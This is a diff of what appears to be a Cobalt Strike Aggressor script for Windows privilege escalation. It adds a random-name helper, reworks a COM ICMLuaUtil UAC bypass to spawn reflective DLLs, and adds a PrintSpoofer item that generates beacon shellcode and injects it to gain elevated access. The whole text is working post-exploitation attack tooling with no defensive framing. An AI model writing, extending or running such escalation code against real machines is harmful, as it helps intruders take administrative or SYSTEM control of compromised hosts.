@@ -1,3 +1,16 @@
+sub Getname{
+    local('$fname');
+    $fname = "";
+    @array = @("a", "b", "c", "d", "e", "f", "g", "h", "i" ,"0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $total = 12;
+    while($total >= 0){
+        $fname = $fname.rand(@array);
+        $total = $total - 1;
+    }
+    return $fname;
+}
+
+
 sub ms16032{
     btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via ms16-032");
     local('$Rch $payload $fname');
@@ -46,18 +59,13 @@ sub SweetPotato_Command {
 sub combypassuac_{
     btask($3['bid'], "Type: Elevated COM interface");
     btask($3['bid'], "Method: ICMLuaUtil");
-    if (-is64 $3['bid']){
-        blog($3['bid'], "The Beacon Arch:x64");
-        $dllpath = script_resource("bin/combypass.x64.dll");
-        bupload!($3['bid'], $dllpath);
-        bshell($3['bid'], "rundll32 combypass.x64.dll,MyBypassUAC $3['executepath']");
-        brm($3['bid'], "combypass.dll");
+    
+    if (barch($3['bid'])=="x64"){
+        blog($3['bid'], "Arch is: " .barch($3['bid']));
+        bdllspawn($3['bid'], script_resource("bin/comBypassUac.x64.dll"), $3['executepath'], "comBypassUac", 5000, false);
     }else{
-        blog($3['bid'], "The Beacon Arch:x86");
-        $dllpath = script_resource("bin/combypass.dll");
-        bupload!($3['bid'], $dllpath);
-        bshell($3['bid'], "rundll32 combypass.dll,MyBypassUAC $3['executepath']");
-        brm($3['bid'], "combypass.dll");
+        blog($3['bid'], "Arch is: " .barch($3['bid']));
+        bdllspawn($3['bid'], script_resource("bin/comBypassUac.dll"), $3['executepath'], "comBypassUac", 5000, false);
     }
 
     
@@ -88,6 +96,11 @@ sub UacviaProgIDs{
     }
 }
 
+sub printspoofer {
+    
+}
+
+
 
 menu "提权"{
     item "MS16-032"{
@@ -113,6 +126,20 @@ menu "提权"{
             drow_text($Dialog, "cmd", "Command:");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
+        }
+    item "Printspoofer-dllrefleact"{
+        btask($1, "Task Beacon to run " . listener_describe($2) . " via PrintSpoofer");
+        if (-is64 $1)
+        {
+            $arch = "x64";
+            $dll = script_resource("bin/PrintSpoofer.x64.dll");
+        } else {
+            $arch = "x86";
+            $dll = script_resource("bin/PrintSpoofer.dll");
+        }
+        $stager = shellcode($2, false, $arch);
+        bdllspawn!($1, $dll, $stager, "PrintSpoofer local elevate privilege", 5000);
+        bstage($1, $null, $2, $arch);
         }
     menu "UAC"{
         item "Bypass uac via ProgIDs"{
